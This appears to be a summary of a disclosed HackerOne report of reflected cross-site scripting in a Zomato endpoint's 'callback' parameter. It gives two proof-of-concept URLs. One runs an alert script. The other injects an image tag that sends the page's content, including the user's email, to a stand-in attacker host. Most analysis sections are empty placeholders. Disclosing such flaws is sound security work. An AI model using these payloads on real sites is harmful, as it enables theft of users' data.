# Reflected Cross-Site Scripting in www.zomato.com/php/instagram_tag_relay

## Metadata
- **Source:** HackerOne
- **Report:** 138262 | https://hackerone.com/reports/138262
- **Submitted:** 2016-05-12
- **Reporter:** dejavuln
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
`https://www.zomato.com/php/instagram_tag_relay` is vulnerable to XSS via the `callback` parameter (both POST and GET).

PoC:  
`https://www.zomato.com/php/instagram_tag_relay?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E`

In addition, when a Zomato user accesses the page after having connected his Zomato account to Instagram, the page contains sensitive data (such as the user's email 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

`https://www.zomato.com/php/instagram_tag_relay` is vulnerable to XSS via the `callback` parameter (both POST and GET).

PoC:  
`https://www.zomato.com/php/instagram_tag_relay?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E`

In addition, when a Zomato user accesses the page after having connected his Zomato account to Instagram, the page contains sensitive data (such as the user's email address). An attacker can use the vulnerability to access this data. 

PoC:
`https://www.zomato.com/php/instagram_tag_relay?callback=><img+src%3dhttps%3a//example.org/%3f`

(causes the victim's browser to send a request to the attacker's server `example.org`, leaking the page's content).

</details>

---
*Analysed by Claude on 2026-05-24*
